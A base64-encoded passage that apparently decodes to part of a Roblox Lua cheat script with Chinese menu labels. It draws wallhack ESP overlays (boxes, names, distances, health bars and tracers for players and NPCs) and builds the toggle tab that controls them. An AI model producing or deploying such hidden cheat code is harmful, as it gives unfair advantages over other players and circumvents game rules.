heWVyczpHZXRQbGF5ZXJzKCkpIGRvCiAgICAgICAgICAgIGlmIHBsciA9PSBMb2NhbFBsYXllciB0aGVuIGNvbnRpbnVlIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgaWYgZXNwU2V0dGluZ3Muc2hvd0VuZW15T25seSBhbmQgaXNUZWFtbWF0ZShwbHIpIHRoZW4KICAgICAgICAgICAgICAgIGlmIGVzcENhY2hlW3Bscl0gdGhlbgogICAgICAgICAgICAgICAgICAgIGZvciBfLCBvYmogaW4gcGFpcnMoZXNwQ2FjaGVbcGxyXSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgb2JqLlZpc2libGUgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIGxvY2FsIGNoYXIgPSBwbHIuQ2hhcmFjdGVyCiAgICAgICAgICAgIGlmIG5vdCBjaGFyIHRoZW4KICAgICAgICAgICAgICAgIGlmIGVzcENhY2hlW3Bscl0gdGhlbgogICAgICAgICAgICAgICAgICAgIGZvciBfLCBvYmogaW4gcGFpcnMoZXNwQ2FjaGVbcGxyXSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgb2JqLlZpc2libGUgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBjb250aW51ZSAKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIAogICAgICAgICAgICBsb2NhbCByb290ID0gY2hhcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgICAgIGxvY2FsIGhlYWQgPSBjaGFyOkZpbmRGaXJzdENoaWxkKCJIZWFkIikKICAgICAgICAgICAgbG9jYWwgaHVtYW5vaWQgPSBjaGFyOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiSHVtYW5vaWQiKQogICAgICAgICAgICAKICAgICAgICAgICAgaWYgbm90IChyb290IGFuZCBoZWFkIGFuZCBodW1hbm9pZCkgdGhlbiBjb250aW51ZSBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIGxvY2FsIHJvb3RQb3MsIHJvb3RWaXMgPSBDYW1lcmE6V29ybGRUb1ZpZXdwb3J0UG9pbnQocm9vdC5Qb3NpdGlvbikKICAgICAgICAgICAgbG9jYWwgaGVhZFBvcywgaGVhZFZpcyA9IENhbWVyYTpXb3JsZFRvVmlld3BvcnRQb2ludChoZWFkLlBvc2l0aW9uICsgVmVjdG9yMy5uZXcoMCwgMS41LCAwKSkKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmIG5vdCAocm9vdFZpcyBhbmQgaGVhZFZpcykgdGhlbgogICAgICAgICAgICAgICAgaWYgZXNwQ2FjaGVbcGxyXSB0aGVuCiAgICAgICAgICAgICAgICAgICAgZm9yIF8sIG9iaiBpbiBwYWlycyhlc3BDYWNoZVtwbHJdKSBkbwogICAgICAgICAgICAgICAgICAgICAgICBvYmouVmlzaWJsZSA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICAKICAgICAgICAgICAgbG9jYWwgZXNwID0gZXNwQ2FjaGVbcGxyXSBvciBjcmVhdGVFU1BPYmplY3QocGxyKQogICAgICAgICAgICAKICAgICAgICAgICAgbG9jYWwgaGVpZ2h0ID0gbWF0aC5hYnMoaGVhZFBvcy5ZIC0gcm9vdFBvcy5ZKSAqIDEuNQogICAgICAgICAgICBsb2NhbCB3aWR0aCA9IGhlaWdodCAqIDAuNgogICAgICAgICAgICBsb2NhbCBsZWZ0ID0gaGVhZFBvcy5YIC0gd2lkdGggLyAyCiAgICAgICAgICAgIGxvY2FsIHJpZ2h0ID0gaGVhZFBvcy5YICsgd2lkdGggLyAyCiAgICAgICAgICAgIAogICAgICAgICAgICBsb2NhbCBjb2xvciA9IGdldFRlYW1Db2xvcihwbHIpCiAgICAgICAgICAgIAogICAgICAgICAgICAtLSDni6znq4vmjqfliLbmr4/kuKrlhYPntKDnmoTmmL7npLoKICAgICAgICAgICAgZXNwLkJveC5WaXNpYmxlID0gZXNwU2V0dGluZ3Muc2hvd0JveAogICAgICAgICAgICBlc3AuQm94LkNvbG9yID0gY29sb3IKICAgICAgICAgICAgZXNwLkJveC5Qb2ludEEgPSBWZWN0b3IyLm5ldyhsZWZ0LCBoZWFkUG9zLlkpCiAgICAgICAgICAgIGVzcC5Cb3guUG9pbnRCID0gVmVjdG9yMi5uZXcocmlnaHQsIGhlYWRQb3MuWSkKICAgICAgICAgICAgZXNwLkJveC5Qb2ludEMgPSBWZWN0b3IyLm5ldyhyaWdodCwgaGVhZFBvcy5ZICsgaGVpZ2h0KQogICAgICAgICAgICBlc3AuQm94LlBvaW50RCA9IFZlY3RvcjIubmV3KGxlZnQsIGhlYWRQb3MuWSArIGhlaWdodCkKICAgICAgICAgICAgCiAgICAgICAgICAgIGVzcC5OYW1lLlZpc2libGUgPSBlc3BTZXR0aW5ncy5zaG93TmFtZQogICAgICAgICAgICBlc3AuTmFtZS5Db2xvciA9IGNvbG9yCiAgICAgICAgICAgIGVzcC5OYW1lLlBvc2l0aW9uID0gVmVjdG9yMi5uZXcoaGVhZFBvcy5YLCBoZWFkUG9zLlkgLSAyMCkKICAgICAgICAgICAgZXNwLk5hbWUuVGV4dCA9IHBsci5OYW1lCiAgICAgICAgICAgIAogICAgICAgICAgICBsb2NhbCBkaXN0YW5jZSA9IG1hdGguZmxvb3IoKHJvb3QuUG9zaXRpb24gLSBDYW1lcmEuQ0ZyYW1lLlBvc2l0aW9uKS5NYWduaXR1ZGUpCiAgICAgICAgICAgIGVzcC5EaXN0YW5jZS5WaXNpYmxlID0gZXNwU2V0dGluZ3Muc2hvd0Rpc3RhbmNlCiAgICAgICAgICAgIGVzcC5EaXN0YW5jZS5Db2xvciA9IGNvbG9yCiAgICAgICAgICAgIGVzcC5EaXN0YW5jZS5Qb3NpdGlvbiA9IFZlY3RvcjIubmV3KGhlYWRQb3MuWCwgaGVhZFBvcy5ZICsgaGVpZ2h0ICsgNSkKICAgICAgICAgICAgZXNwLkRpc3RhbmNlLlRleHQgPSB0b3N0cmluZyhkaXN0YW5jZSkgLi4gIm0iCiAgICAgICAgICAgIAogICAgICAgICAgICBsb2NhbCBoZWFsdGhQZXJjZW50ID0gbWF0aC5jbGFtcChodW1hbm9pZC5IZWFsdGggLyBodW1hbm9pZC5NYXhIZWFsdGgsIDAsIDEpCiAgICAgICAgICAgIGxvY2FsIGJhcldpZHRoID0gd2lkdGgKICAgICAgICAgICAgbG9jYWwgYmFySGVpZ2h0ID0gNQogICAgICAgICAgICBsb2NhbCBiYXJYID0gbGVmdAogICAgICAgICAgICBsb2NhbCBiYXJZID0gaGVhZFBvcy5ZICsgaGVpZ2h0ICsgMjAKICAgICAgICAgICAgCiAgICAgICAgICAgIGVzcC5IZWFsdGhCYXIuVmlzaWJsZSA9IGVzcFNldHRpbmdzLnNob3dIZWFsdGhCYXIKICAgICAgICAgICAgZXNwLkhlYWx0aEJhci5Db2xvciA9IENvbG9yMy5uZXcoMSAtIGhlYWx0aFBlcmNlbnQsIGhlYWx0aFBlcmNlbnQsIDApCiAgICAgICAgICAgIGVzcC5IZWFsdGhCYXIuUG9pbnRBID0gVmVjdG9yMi5uZXcoYmFyWCwgYmFyWSkKICAgICAgICAgICAgZXNwLkhlYWx0aEJhci5Qb2ludEIgPSBWZWN0b3IyLm5ldyhiYXJYICsgYmFyV2lkdGggKiBoZWFsdGhQZXJjZW50LCBiYXJZKQogICAgICAgICAgICBlc3AuSGVhbHRoQmFyLlBvaW50QyA9IFZlY3RvcjIubmV3KGJhclggKyBiYXJXaWR0aCAqIGhlYWx0aFBlcmNlbnQsIGJhclkgKyBiYXJIZWlnaHQpCiAgICAgICAgICAgIGVzcC5IZWFsdGhCYXIuUG9pbnREID0gVmVjdG9yMi5uZXcoYmFyWCwgYmFyWSArIGJhckhlaWdodCkKICAgICAgICAgICAgCiAgICAgICAgICAgIGVzcC5IZWFsdGhUZXh0LlZpc2libGUgPSBlc3BTZXR0aW5ncy5zaG93SGVhbHRoVGV4dAogICAgICAgICAgICBlc3AuSGVhbHRoVGV4dC5Db2xvciA9IENvbG9yMy5uZXcoMSwgMSwgMSkKICAgICAgICAgICAgZXNwLkhlYWx0aFRleHQuUG9zaXRpb24gPSBWZWN0b3IyLm5ldyhiYXJYICsgYmFyV2lkdGggLyAyLCBiYXJZIC0gMTApCiAgICAgICAgICAgIGVzcC5IZWFsdGhUZXh0LlRleHQgPSBtYXRoLmZsb29yKGh1bWFub2lkLkhlYWx0aCkgLi4gIi8iIC4uIG1hdGguZmxvb3IoaHVtYW5vaWQuTWF4SGVhbHRoKQogICAgICAgICAgICAKICAgICAgICAgICAgZXNwLlRyYWNlci5WaXNpYmxlID0gZXNwU2V0dGluZ3Muc2hvd1RyYWNlcgogICAgICAgICAgICBlc3AuVHJhY2VyLkNvbG9yID0gY29sb3IKICAgICAgICAgICAgCiAgICAgICAgICAgIGxvY2FsIHN0YXJ0UG9pbnQKICAgICAgICAgICAgaWYgZXNwU2V0dGluZ3MudHJhY2VyUG9zaXRpb24gPT0gIlRvcCIgdGhlbgogICAgICAgICAgICAgICAgc3RhcnRQb2ludCA9IFZlY3RvcjIubmV3KENhbWVyYS5WaWV3cG9ydFNpemUuWC8yLCAwKQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICBzdGFydFBvaW50ID0gVmVjdG9yMi5uZXcoQ2FtZXJhLlZpZXdwb3J0U2l6ZS5YLzIsIENhbWVyYS5WaWV3cG9ydFNpemUuWSkKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIAogICAgICAgICAgICBsb2NhbCBlbmRQb2ludCA9IFZlY3RvcjIubmV3KGhlYWRQb3MuWCwgaGVhZFBvcy5ZICsgaGVpZ2h0LzIpCiAgICAgICAgICAgIAogICAgICAgICAgICBlc3AuVHJhY2VyLkZyb20gPSBzdGFydFBvaW50CiAgICAgICAgICAgIGVzcC5UcmFjZXIuVG8gPSBlbmRQb2ludAogICAgICAgIGVuZAogICAgICAgIAogICAgICAgIGZvciBwbHIsIGVzcCBpbiBwYWlycyhlc3BDYWNoZSkgZG8KICAgICAgICAgICAgaWYgbm90IHBsciBvciBub3QgcGxyLlBhcmVudCBvciBwbHIgPT0gTG9jYWxQbGF5ZXIgdGhlbgogICAgICAgICAgICAgICAgZm9yIF8sIG9iaiBpbiBwYWlycyhlc3ApIGRvCiAgICAgICAgICAgICAgICAgICAgb2JqLlZpc2libGUgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgIG9iajpSZW1vdmUoKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlc3BDYWNoZVtwbHJdID0gbmlsCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCgogICAgbG9jYWwgZXNwTG9vcAogICAgCiAgICAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQogICAgLS0gTlBDIOmAj+inhu+8iOWinuW8uueJiO+8iS0g5Y2H57qn5Li654us56uL5byA5YWz6ZSuCiAgICAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQogICAgbG9jYWwgbnBjRXNwU2V0dGluZ3MgPSB7CiAgICAgICAgZW5hYmxlZCA9IGZhbHNlLAogICAgICAgIHNob3dCb3ggPSBmYWxzZSwKICAgICAgICBzaG93TmFtZSA9IGZhbHNlLAogICAgICAgIHNob3dEaXN0YW5jZSA9IGZhbHNlCiAgICB9CiAgICAKICAgIGxvY2FsIG5wY0VzcENhY2hlID0ge30KICAgIAogICAgbG9jYWwgZnVuY3Rpb24gY3JlYXRlTnBjRVNQT2JqZWN0KG1vZGVsKQogICAgICAgIGxvY2FsIGVzcCA9IHsKICAgICAgICAgICAgQm94ID0gRHJhd2luZy5uZXcoIlF1YWQiKSwKICAgICAgICAgICAgTmFtZSA9IERyYXdpbmcubmV3KCJUZXh0IiksCiAgICAgICAgICAgIERpc3RhbmNlID0gRHJhd2luZy5uZXcoIlRleHQiKQogICAgICAgIH0KICAgICAgICAKICAgICAgICBlc3AuQm94LlRoaWNrbmVzcyA9IDEuNQogICAgICAgIGVzcC5Cb3guRmlsbGVkID0gZmFsc2UKICAgICAgICBlc3AuQm94LkNvbG9yID0gQ29sb3IzLmZyb21SR0IoMjU1LCAxNjUsIDApCiAgICAgICAgZXNwLkJveC5aSW5kZXggPSA0CiAgICAgICAgCiAgICAgICAgZXNwLk5hbWUuU2l6ZSA9IDE2CiAgICAgICAgZXNwLk5hbWUuQ2VudGVyID0gdHJ1ZQogICAgICAgIGVzcC5OYW1lLk91dGxpbmUgPSB0cnVlCiAgICAgICAgZXNwLk5hbWUuQ29sb3IgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDE2NSwgMCkKICAgICAgICBlc3AuTmFtZS5aSW5kZXggPSA0CiAgICAgICAgCiAgICAgICAgZXNwLkRpc3RhbmNlLlNpemUgPSAxNAogICAgICAgIGVzcC5EaXN0YW5jZS5DZW50ZXIgPSB0cnVlCiAgICAgICAgZXNwLkRpc3RhbmNlLk91dGxpbmUgPSB0cnVlCiAgICAgICAgZXNwLkRpc3RhbmNlLkNvbG9yID0gQ29sb3IzLmZyb21SR0IoMjU1LCAxNjUsIDApCiAgICAgICAgZXNwLkRpc3RhbmNlLlpJbmRleCA9IDQKICAgICAgICAKICAgICAgICBucGNFc3BDYWNoZVttb2RlbF0gPSBlc3AKICAgICAgICByZXR1cm4gZXNwCiAgICBlbmQKICAgIAogICAgbG9jYWwgZnVuY3Rpb24gdXBkYXRlTnBjRVNQKCkKICAgICAgICBpZiBub3QgbnBjRXNwU2V0dGluZ3MuZW5hYmxlZCB0aGVuIHJldHVybiBlbmQKICAgICAgICAKICAgICAgICBmb3IgXywgbW9kZWwgaW4gaXBhaXJzKHdvcmtzcGFjZTpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICBpZiBtb2RlbDpJc0EoIk1vZGVsIikgYW5kIG1vZGVsOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiSHVtYW5vaWQiKSBhbmQgbm90IFBsYXllcnM6R2V0UGxheWVyRnJvbUNoYXJhY3Rlcihtb2RlbCkgdGhlbgogICAgICAgICAgICAgICAgbG9jYWwgcm9vdCA9IG1vZGVsOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0Iikgb3IgbW9kZWw6RmluZEZpcnN0Q2hpbGQoIlRvcnNvIikKICAgICAgICAgICAgICAgIGxvY2FsIGhlYWQgPSBtb2RlbDpGaW5kRmlyc3RDaGlsZCgiSGVhZCIpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGlmIG5vdCAocm9vdCBhbmQgaGVhZCkgdGhlbgogICAgICAgICAgICAgICAgICAgIGlmIG5wY0VzcENhY2hlW21vZGVsXSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciBfLCBvYmogaW4gcGFpcnMobnBjRXNwQ2FjaGVbbW9kZWxdKSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgb2JqLlZpc2libGUgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGxvY2FsIHJvb3RQb3MsIHJvb3RWaXMgPSBDYW1lcmE6V29ybGRUb1ZpZXdwb3J0UG9pbnQocm9vdC5Qb3NpdGlvbikKICAgICAgICAgICAgICAgIGxvY2FsIGhlYWRQb3MsIGhlYWRWaXMgPSBDYW1lcmE6V29ybGRUb1ZpZXdwb3J0UG9pbnQoaGVhZC5Qb3NpdGlvbiArIFZlY3RvcjMubmV3KDAsIDEuNSwgMCkpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGlmIG5vdCAocm9vdFZpcyBhbmQgaGVhZFZpcykgdGhlbgogICAgICAgICAgICAgICAgICAgIGlmIG5wY0VzcENhY2hlW21vZGVsXSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciBfLCBvYmogaW4gcGFpcnMobnBjRXNwQ2FjaGVbbW9kZWxdKSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgb2JqLlZpc2libGUgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGxvY2FsIGVzcCA9IG5wY0VzcENhY2hlW21vZGVsXSBvciBjcmVhdGVOcGNFU1BPYmplY3QobW9kZWwpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGxvY2FsIGhlaWdodCA9IG1hdGguYWJzKGhlYWRQb3MuWSAtIHJvb3RQb3MuWSkgKiAxLjUKICAgICAgICAgICAgICAgIGxvY2FsIHdpZHRoID0gaGVpZ2h0ICogMC42CiAgICAgICAgICAgICAgICBsb2NhbCBsZWZ0ID0gaGVhZFBvcy5YIC0gd2lkdGggLyAyCiAgICAgICAgICAgICAgICBsb2NhbCByaWdodCA9IGhlYWRQb3MuWCArIHdpZHRoIC8gMgogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBlc3AuQm94LlZpc2libGUgPSBucGNFc3BTZXR0aW5ncy5zaG93Qm94CiAgICAgICAgICAgICAgICBlc3AuQm94LlBvaW50QSA9IFZlY3RvcjIubmV3KGxlZnQsIGhlYWRQb3MuWSkKICAgICAgICAgICAgICAgIGVzcC5Cb3guUG9pbnRCID0gVmVjdG9yMi5uZXcocmlnaHQsIGhlYWRQb3MuWSkKICAgICAgICAgICAgICAgIGVzcC5Cb3guUG9pbnRDID0gVmVjdG9yMi5uZXcocmlnaHQsIGhlYWRQb3MuWSArIGhlaWdodCkKICAgICAgICAgICAgICAgIGVzcC5Cb3guUG9pbnREID0gVmVjdG9yMi5uZXcobGVmdCwgaGVhZFBvcy5ZICsgaGVpZ2h0KQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBlc3AuTmFtZS5WaXNpYmxlID0gbnBjRXNwU2V0dGluZ3Muc2hvd05hbWUKICAgICAgICAgICAgICAgIGVzcC5OYW1lLlBvc2l0aW9uID0gVmVjdG9yMi5uZXcoaGVhZFBvcy5YLCBoZWFkUG9zLlkgLSAxNSkKICAgICAgICAgICAgICAgIGVzcC5OYW1lLlRleHQgPSBtb2RlbC5OYW1lCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGxvY2FsIGRpc3RhbmNlID0gbWF0aC5mbG9vcigocm9vdC5Qb3NpdGlvbiAtIENhbWVyYS5DRnJhbWUuUG9zaXRpb24pLk1hZ25pdHVkZSkKICAgICAgICAgICAgICAgIGVzcC5EaXN0YW5jZS5WaXNpYmxlID0gbnBjRXNwU2V0dGluZ3Muc2hvd0Rpc3RhbmNlCiAgICAgICAgICAgICAgICBlc3AuRGlzdGFuY2UuUG9zaXRpb24gPSBWZWN0b3IyLm5ldyhoZWFkUG9zLlgsIGhlYWRQb3MuWSArIGhlaWdodCArIDUpCiAgICAgICAgICAgICAgICBlc3AuRGlzdGFuY2UuVGV4dCA9IHRvc3RyaW5nKGRpc3RhbmNlKSAuLiAibSIKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgZm9yIG1vZGVsLCBlc3AgaW4gcGFpcnMobnBjRXNwQ2FjaGUpIGRvCiAgICAgICAgICAgIGlmIG5vdCBtb2RlbCBvciBub3QgbW9kZWwuUGFyZW50IHRoZW4KICAgICAgICAgICAgICAgIGZvciBfLCBvYmogaW4gcGFpcnMoZXNwKSBkbwogICAgICAgICAgICAgICAgICAgIG9iai5WaXNpYmxlID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICBvYmo6UmVtb3ZlKCkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgbnBjRXNwQ2FjaGVbbW9kZWxdID0gbmlsCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCiAgICAKICAgIGxvY2FsIG5wY0VzcExvb3AKICAgIAogICAgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KICAgIC0tIOmAj+inhuWKn+iDveeLrOeri+agh+etvumhtSAtIOWNh+e6p+S4uueLrOeri+W8gOWFs+mUrueJiOacrAogICAgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KICAgIGxvY2FsIFRhYjQgPSBXaW5kb3c6Q3JlYXRlVGFiKCLpgI/op4blip/og70iLCA3NzMzOTYxNzQ5KQogICAgCiAgICBUYWI0OkNyZWF0ZVNlY3Rpb24oIueOqeWutumAj+inhuiuvue9riIpCiAgICBUYWI0OkNyZWF0ZVRvZ2dsZSh7CiAgICAgICAgTmFtZSA9ICLlkK/nlKjnjqnlrrbpgI/op4YiLCAKICAgICAgICBDdXJyZW50VmFsdWUgPSBlc3BTZXR0aW5ncy5lbmFibGVkLCAKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHYpCiAgICAgICAgICAgIGVzcFNldHRpbmdzLmVuYWJsZWQgPSB2CiAgICAgICAgICAgIGlmIHYgdGhlbgogICAgICAgICAgICAgICAgaWYgbm90IGVzcExvb3AgdGhlbgogICAgICAgICAgICAgICAgICAgIGVzcExvb3AgPSBnYW1lOkdldFNlcnZpY2UoIlJ1blNlcnZpY2UiKS5SZW5kZXJTdGVwcGVkOkNvbm5lY3QodXBkYXRlRVNQKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIGlmIGVzcExvb3AgdGhlbgogICAgICAgICAgICAgICAgICAgIGVzcExvb3A6RGlzY29ubmVjdCgpCiAgICAgICAgICAgICAgICAgICAgZXNwTG9vcCA9IG5pbAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBmb3IgcGxyLCBlc3AgaW4gcGFpcnMoZXNwQ2FjaGUpIGRvCiAgICAgICAgICAgICAgICAgICAgZm9yIF8sIG9iaiBpbiBwYWlycyhlc3ApIGRvCiAgICAgICAgICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkgb2JqOlJlbW92ZSgpIGVuZCkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgdGFibGUuY2xlYXIoZXNwQ2FjaGUpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgfSkKCiAgICBUYWI0OkNyZWF0ZVNlY3Rpb24oIueOqeWutumAj+inhuWFg+e0oCIpCiAgICBUYWI0OkNyZWF0ZVRvZ2dsZSh7CiAgICAgICAgTmFtZSA9ICLmmL7npLrmlrnmoYYiLAogICAgICAgIEN1cnJlbnRWYWx1ZSA9IGVzcFNldHRpbmdzLnNob3dCb3gsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih2KQogICAgICAgICAgICBlc3BTZXR0aW5ncy5zaG93Qm94ID0gdgogICAgICAgIGVuZAogICAgfSkKCiAgICBUYWI0OkNyZWF0ZVRvZ2dsZSh7CiAgICAgICAgTmFtZSA9ICLmmL7npLrlkI3lrZciLAogICAgICAgIEN1cnJlbnRWYWx1ZSA9IGVzcFNldHRpbmdzLnNob3dOYW1lLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24odikKICAgICAgICAgICAgZXNwU2V0dGluZ3Muc2hvd05hbWUgPSB2CiAgICAgICAgZW5kCiAgICB9KQoKICAgIFRhYjQ6Q3JlYXRlVG9nZ2xlKHsKICAgICAgICBOYW1lID0gIuaYvuekuui3neemuyIsCiAgICAgICAgQ3VycmVudFZhbHVlID0gZXNwU2V0dGluZ3Muc2hvd0Rpc3RhbmNlLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24odikKICAgICAgICAgICAgZXNwU2V0dGluZ3Muc2hvd0Rpc3RhbmNlID0gdgogICAgICAgIGVuZAogICAgfSkKCiAgICBUYWI0OkNyZWF0ZVRvZ2dsZSh7CiAgICAgICAgTmFtZSA9ICLmmL7npLrooYDmnaEiLAogICAgICAgIEN1cnJlbnRWYWx1ZSA9IGVzcFNldHRpbmdzLnNob3dIZWFsdGhCYXIsCiAgICAgICAgQ2FsbGJhY2sgPSBmdW5jdGlvbih2KQogICAgICAgICAgICBlc3BTZXR0aW5ncy5zaG93SGVhbHRoQmFyID0gdgogICAgICAgIGVuZAogICAgfSkKCiAgICBUYWI0OkNyZWF0ZVRvZ2dsZSh7CiAgICAgICAgTmFtZSA9ICLmmL7npLrooYDph4/mloflrZciLAogICAgICAgIEN1cnJlbnRWYWx1ZSA9IGVzcFNldHRpbmdzLnNob3dIZWFsdGhUZXh0LAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24odikKICAgICAgICAgICAgZXNwU2V0dGluZ3Muc2hvd0hlYWx0aFRleHQgPSB2CiAgICAgICAgZW5kCiAgICB9KQoKICAgIFRhYjQ6Q3JlYXRlVG9nZ2xlKHsKICAgICAgICBOYW1lID0gIuaYvuekuui/vei4que6v+adoSIsCiAgICAgICAgQ3VycmVudFZhbHVlID0gZXNwU2V0dGluZ3Muc2hvd1RyYWNlciwKICAgICAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHYpCiAgICAgICAgICAgIGVzcFNldHRpbmdzLnNob3dUcmFjZXIgPSB2CiAgICAgICAgZW5kCiAgICB9KQoKICAgIFRhYjQ6Q3JlYXRlRHJvcGRvd24oewogICAgICAgIE5hbWUgPSAi57q/5p2h5L2N572uIiwKICAgICAgICBPcHRpb25zID0geyJUb3AiLCAiQm90dG9tIn0sCiAgICAgICAgQ3VycmVudE9wdGlvbiA9IGVzcFNldHRpbmdzLnRyYWNlclBvc2l0aW9uLAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24odmFsdWUpCiAgICAgICAgICAgIGVzcFNldHRpbmdzLnRyYWNlclBvc2l0aW9uID0gdmFsdWUKICAgICAgICBlbmQKICAgIH0pCgogICAgVGFiNDpDcmVhdGVUb2dnbGUoewogICAgICAgIE5hbWUgPSAi5Y+q5pi+56S65pWM5Lq6IiwKICAgICAgICBDdXJyZW50VmFsdWUgPSBlc3BTZXR0aW5ncy5zaG93RW5lbXlPbmx5LAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24odikKICAgICAgICAgICAgZXNwU2V0dGluZ3Muc2hvd0VuZW15T25seSA9IHYKICAgICAgICBlbmQKICAgIH0pCiAgICAKICAgIFRhYjQ6Q3JlYXRlU2VjdGlvbigiTlBD6YCP6KeG6K6+572uIikKICAgIFRhYjQ6Q3JlYXRlVG9nZ2xlKHsKICAgICAgICBOYW1lID0gIuWQr+eUqE5QQ+mAj+inhiIsIAogICAgICAgIEN1cnJlbnRWYWx1ZSA9IG5wY0VzcFNldHRpbmdzLmVuYWJsZWQsIAogICAgICAgIENhbGxiYWNrID0gZnVuY3Rpb24odikKICAgICAgICAgICAgbnBjRXNwU2V0dGluZ3MuZW5hYmxlZCA9IHYKICAgICAgICAgICAgaWYgdiB0aGVuCiAgICAgICAgICAgICAgICBpZiBub3QgbnBjRXNwTG9vcCB0aGVuCiAgICAgICAgICAgICAgICAgICAgbnBjRXNwTG9vcCA9IGdhbWU6R2V0U2VydmljZSgiUnVuU2VydmljZSIpLlJlbmRlclN0ZXBwZWQ6Q29ubmVjdCh1cGRhdGVOcGNFU1ApCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgaWYgbnBjRXNwTG9vcCB0aGVuCiAgICAgICAgICAgICAgICAgICAgbnBjRXNwTG9vcDpEaXNjb25uZWN0KCkKICAgICAgICAgICAgICAgICAgICBucGNFc3BMb29wID0gbmlsCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGZvciBtb2RlbCwgZXNwIGluIHBhaXJzKG5wY0VzcENhY2hlKSBkbwogICAgICAgICAgICAgICAgICAgIGZvciBfLCBvYmogaW4gcGFpcnMoZXNwKSBkbwogICAgICAgICAgICAgICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpIG9iajpSZW1vdmUoKSBlbmQpCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIHRhYmxlLmNsZWFyKG5wY0VzcENhY2hlKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIH0pCiAgICAKICAgIFRhYjQ6Q3JlYXRlU2VjdGlvbigiTlBD6YCP6KeG5YWD57SgIikKICAgIFRhYjQ6Q3JlYXRlVG9nZ2xlKHsKICAgICAgICBOYW1lID0gIuaYvuekuuaWueahhiIsCiAgICAgICAgQ3VycmVudFZhbHVlID0gbnBjRXNwU2V0dGluZ3